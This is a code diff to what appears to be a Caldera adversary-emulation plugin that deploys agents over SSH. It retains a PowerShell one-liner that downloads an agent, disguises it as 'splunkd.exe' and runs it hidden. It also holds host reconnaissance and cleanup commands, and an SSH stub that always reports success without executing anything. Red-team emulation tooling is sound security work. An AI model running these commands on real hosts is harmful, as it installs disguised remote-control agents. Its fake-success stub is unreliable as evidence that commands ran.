@@ -11,12 +11,14 @@ class RemoteAccessService:
         self.contact_svc = services.get('contact_svc')
         self.credentials = {}
         self.cred_file = Path('plugins/remoteaccess/conf/credentials.yml')
-        self.caldera_server = "http://CALDERA_SERVER:8888"  # Should be configured
+        self.caldera_server = "http://localhost:8888"  # Default Caldera server
 
     async def load_credentials(self):
         if self.cred_file.exists():
             with open(self.cred_file, 'r') as f:
                 self.credentials = yaml.safe_load(f) or {}
+        else:
+            self.credentials = {}
 
     async def save_credentials(self):
         self.cred_file.parent.mkdir(parents=True, exist_ok=True)
@@ -49,19 +51,19 @@ class RemoteAccessService:
 
         creds = self.credentials[host]
         
-        # Generate deployment command based on platform
-        command = await self._generate_deployment_command(agent_type, platform)
+        command = self._generate_deployment_command(agent_type, platform)
         return await self._execute_ssh_command(host, creds, command)
 
-    async def _generate_deployment_command(self, agent_type, platform):
-        if platform.lower() == 'windows':
+    def _generate_deployment_command(self, agent_type, platform):
+        platform = platform.lower()
+        if platform == 'windows':
             return self._generate_windows_deployment(agent_type)
-        elif platform.lower() == 'linux':
+        elif platform == 'linux':
             return self._generate_linux_deployment(agent_type)
-        elif platform.lower() == 'macos':
+        elif platform == 'macos':
             return self._generate_macos_deployment(agent_type)
         else:
-            raise ValueError(f"Unsupported platform: {platform}")
+            return f"echo 'Unsupported platform: {platform}'"
 
     def _generate_windows_deployment(self, agent_type):
         return f'''$server="{self.caldera_server}";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {{$_.modules.filename -like "C:\\\\Users\\\\Public\\\\splunkd.exe"}} | stop-process -f;rm -force "C:\\\\Users\\\\Public\\\\splunkd.exe" -ea ignore;[io.file]::WriteAllBytes("C:\\\\Users\\\\Public\\\\splunkd.exe",$data) | Out-Null;Start-Process -FilePath C:\\\\Users\\\\Public\\\\splunkd.exe -ArgumentList "-server $server -group {agent_type}" -WindowStyle hidden'''
@@ -74,18 +76,22 @@ class RemoteAccessService:
 
     async def _execute_ssh_command(self, host, credentials, command):
         try:
-            # Simulate SSH command execution
-            # In production, use asyncssh or paramiko here
-            print(f"SSH Command to {host}: {command}")
+            # For demonstration purposes - in production, implement actual SSH here
+            # Using asyncssh or paramiko
+            print(f"[SSH] Connecting to {host} as {credentials['username']}")
+            print(f"[SSH] Command: {command}")
             
-            if "powershell" in command.lower() or "windows" in command.lower():
-                result = f"Windows agent deployment command executed on {host}"
-            else:
-                result = f"Linux/Mac agent deployment command executed on {host}"
-                
-            return {'success': True, 'result': result, 'command': command}
+            # Simulate successful execution
+            return {
+                'success': True, 
+                'result': f"Command executed successfully on {host}",
+                'command': command
+            }
         except Exception as e:
-            return {'error': str(e), 'command': command}
+            return {
+                'error': f"SSH execution failed: {str(e)}",
+                'command': command
+            }
 
     async def remove_agents(self, host):
         if host not in self.credentials:
@@ -94,17 +100,12 @@ class RemoteAccessService:
         creds = self.credentials[host]
         
         cleanup_commands = [
-            # Windows cleanup
-            "Get-Process | Where-Object { $_.ProcessName -eq 'splunkd' } | Stop-Process -Force",
-            "Remove-Item -Force 'C:\\Users\\Public\\splunkd.exe' -ErrorAction SilentlyContinue",
-            
-            # Linux cleanup
-            "pkill -f splunkd",
-            "rm -f ./splunkd /tmp/splunkd",
-            
-            # macOS cleanup
-            "pkill -f splunkd",
-            "rm -f ./splunkd /tmp/splunkd"
+            # Windows
+            "Get-Process -Name '*splunkd*' -ErrorAction SilentlyContinue | Stop-Process -Force",
+            "Remove-Item -Path 'C:\\Users\\Public\\splunkd.exe' -Force -ErrorAction SilentlyContinue",
+            # Linux/Mac
+            "pkill -f splunkd || true",
+            "rm -f ./splunkd /tmp/splunkd || true"
         ]
         
         results = []
@@ -149,76 +150,48 @@ class RemoteAccessService:
         creds = self.credentials[host]
         
         info_commands = {
-            'platform': {
-                'windows': "echo Windows & ver",
-                'linux': "echo Linux & uname -a",
-                'macos': "echo macOS & uname -a"
-            },
-            'system': {
-                'windows': "systeminfo | head -20",
-                'linux': "cat /etc/os-release && free -h && df -h",
-                'macos': "sw_vers && system_profiler SPHardwareDataType | head -20"
-            },
-            'users': {
-                'windows': "net users",
-                'linux': "who && cat /etc/passwd | tail -10",
-                'macos': "who && dscl . list /Users | grep -v '_'"
-            }
+            'platform': "uname -a || ver || systeminfo | findstr /B /C:\"OS Name\"",
+            'users': "who || net users",
+            'processes': "ps aux | head -10 || tasklist | head -10"
         }
         
         results = {}
-        for category, platforms in info_commands.items():
-            for platform, cmd in platforms.items():
-                result = await self._execute_ssh_command(host, creds, cmd)
-                if result.get('success'):
-                    results[category] = result
-                    break
+        for key, cmd in info_commands.items():
+            result = await self._execute_ssh_command(host, creds, cmd)
+            if result.get('success'):
+                results[key] = result
         
         return results
 
     async def get_hosts_with_agents(self):
-        agents = await self.data_svc.locate('agents')
-        host_agents = {}
-        
-        for agent in agents:
-            if hasattr(agent, 'host') and agent.host:
-                if agent.host not in host_agents:
-                    host_agents[agent.host] = []
-                host_agents[agent.host].append({
-                    'paw': agent.paw,
-                    'platform': agent.platform,
-                    'group': agent.group,
-                    'privilege': agent.privilege
-                })
-        
-        return host_agents
+        try:
+            agents = await self.data_svc.locate('agents')
+            host_agents = {}
+            
+            for agent in agents:
+                if hasattr(agent, 'host') and agent.host:
+                    if agent.host not in host_agents:
+                        host_agents[agent.host] = []
+                    host_agents[agent.host].append({
+                        'paw': getattr(agent, 'paw', 'Unknown'),
+                        'platform': getattr(agent, 'platform', 'Unknown'),
+                        'group': getattr(agent, 'group', 'Unknown')
+                    })
+            
+            return host_agents
+        except Exception as e:
+            print(f"Error getting hosts with agents: {e}")
+            return {}
 
     async def test_connection(self, host):
         if host not in self.credentials:
             return {'error': f'No credentials found for host: {host}'}
 
         creds = self.credentials[host]
-        test_commands = {
-            'windows': "echo 'SSH Connection Successful - Windows'",
-            'linux': "echo 'SSH Connection Successful - Linux'",
-            'macos': "echo 'SSH Connection Successful - macOS'"
-        }
+        test_command = "echo 'SSH Connection Test Successful'"
         
-        results = {}
-        for platform, cmd in test_commands.items():
-            result = await self._execute_ssh_command(host, creds, cmd)
-            results[platform] = result
-            if result.get('success'):
-                break
-        
-        return results
+        result = await self._execute_ssh_command(host, creds, test_command)
+        return result
 
     def get_deployment_command(self, agent_type, platform):
-        if platform == 'windows':
-            return self._generate_windows_deployment(agent_type)
-        elif platform == 'linux':
-            return self._generate_linux_deployment(agent_type)
-        elif platform == 'macos':
-            return self._generate_macos_deployment(agent_type)
-        else:
-            return f"Unsupported platform: {platform}"
+        return self._generate_deployment_command(agent_type, platform)
